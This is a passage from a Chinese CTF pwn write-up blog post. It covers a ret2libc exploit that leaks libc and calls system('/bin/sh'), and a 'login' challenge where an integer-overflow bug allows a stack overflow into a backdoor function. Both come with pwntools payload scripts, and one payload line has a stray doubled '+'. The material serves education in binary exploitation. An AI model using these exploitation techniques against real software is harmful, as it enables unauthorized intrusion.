+payload1 <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0xe7</span> <span class="token operator">+</span> <span class="token string">b"d"</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_add<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
+<span class="token comment">#                                 ret1           ret2</span>
+<span class="token comment">#这里有个套娃：write_plt覆盖的是sub_80487D0函数的返回地址，而write函数是main函数的函数，所以后面需要有三个write的参数，</span>
+payload1 <span class="token operator">+=</span> p<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span> <span class="token operator">+</span> p<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+ <span class="token comment">#write   par1     par2         par3</span>
+read_addr<span class="token operator">=</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment">#得到了write在内存中的位置 所以我们可以用题目提供的函数共享库算出system在内存中的位置</span>
+read_libc<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+base<span class="token operator">=</span>read_addr<span class="token operator">-</span>read_libc
+
+payload2 <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0xe7</span> <span class="token operator">+</span> <span class="token string">b"d"</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment"># p.sendlineafter('Correct\n', payload2)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+</code></pre>
+
+<h1 id="某初赛–login"><a href="#某初赛–login" class="headerlink" title="某初赛–login"></a>某初赛–login</h1><h2 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h2><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220602104537477-4139334.png" alt="image-20220602104537477" loading="lazy"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220602104744252-4139334.png" alt="image-20220602104744252" loading="lazy"></p>
+<h2 id="IDA静态分析-10"><a href="#IDA静态分析-10" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//main</span>
+<span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token class-name">size_t</span> nbytes<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-Ch] BYREF</span>
+
+  nbytes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>
+  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome Back."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please specify the length of the entered password:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+  <span class="token function">check</span><span class="token punctuation">(</span>nbytes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">//check</span>
+<span class="token keyword">int</span> __cdecl <span class="token function">check</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> nbytes<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-28h] BYREF</span>
+  <span class="token keyword">char</span> s2<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+10h] [ebp-18h] BYREF</span>
+
+  <span class="token function">strcpy</span><span class="token punctuation">(</span>s2<span class="token punctuation">,</span> <span class="token string">"82dY65E50f7C8XA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>nbytes <span class="token operator">></span> <span class="token number">16</span> <span class="token punctuation">)</span>  <span class="token comment">//nbytes 是int 默认是有符号的</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please input your password:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// read函数接收变量是无符号的</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> <span class="token number">0xFu</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid Password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>运⾏程序查看程序的逻辑，运⾏程序后会提示输⼊要输⼊的密码的⻓度size，如果size的值⼤于16会直接导致程序</p>
+<p>退出。如果⼩于16就会提示⽤户输⼊密码。如果输⼊的密码正确就会输出success。</p>
+<h3 id="整数溢出漏洞"><a href="#整数溢出漏洞" class="headerlink" title="整数溢出漏洞"></a>整数溢出漏洞</h3><p>⽐如我们可以输⼊⼀个数：-1，-1可以正常的满⾜条件size⼩于16，但是read只能处理⽆符号的数，也就是说会把</p>
+<p>数值-1当做0xFFFFFFFF来处理，0xFFFFFFFF对应正数的话是⾮常⼤的，也就意味着我们可以向Buffer中传⼊相当</p>
+<p>可观⻓度的payload来覆盖程序的返回地址。</p>
+<h3 id="后门函数-1"><a href="#后门函数-1" class="headerlink" title="后门函数"></a>后门函数</h3><p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220602105739437-4139334.png" alt="image-20220602105739437" loading="lazy"></p>
+<p>造成溢出之后，这题的思路就很简单，通过溢出可以转到后门函数</p>
+<h2 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h2><pre class="language-python" data-language="python"><code class="language-python">p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-1'</span><span class="token punctuation">)</span> <span class="token comment"># -1造成整数溢出</span>
+<span class="token comment">#发送</span>
+payload <span class="token operator">=</span> <span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> <span class="token string">b'd'</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x80485D6</span><span class="token punctuation">)</span>  <span class="token comment">#ret2text</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/image-20220602110129760-4139334.png" alt="image-20220602110129760" loading="lazy"></p>
+</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="Donate" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I sell my ass. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/wC1GUz.png"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/wC1GUz.png" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/WwWxDH.png"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/dashi777/pic@master/uPic/WwWxDH.png" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>Dash</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://dashi777.github.io/2022/06/02/PWN-WP/" title="PWN-WP">https://dashi777.github.io/2022/06/02/PWN-WP/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless otherwise stated.</li></ul></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2022/01/30/talking-about-native-bayes/" rel="next" title="浅谈数据分析--朴素贝叶斯算法"><span class="post-nav-text">浅谈数据分析--朴素贝叶斯算法</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>要不要和我说些什么？</span><br></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Dash</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.7.0</span></div><div class="live_time"><span>本博客已萌萌哒地运行</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+  setTimeout(blog_live_time, 1000);
+  const start = new Date('2021-12-23T00:00:00');
+  const now = new Date();
+  const timeDiff = (now.getTime() - start.getTime());
+  const msPerMinute = 60 * 1000;
+  const msPerHour = 60 * msPerMinute;
+  const msPerDay = 24 * msPerHour;
+  const passDay = Math.floor(timeDiff / msPerDay);
+  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
+  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
+  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
+  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
+}
+blog_live_time();
+</script></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>
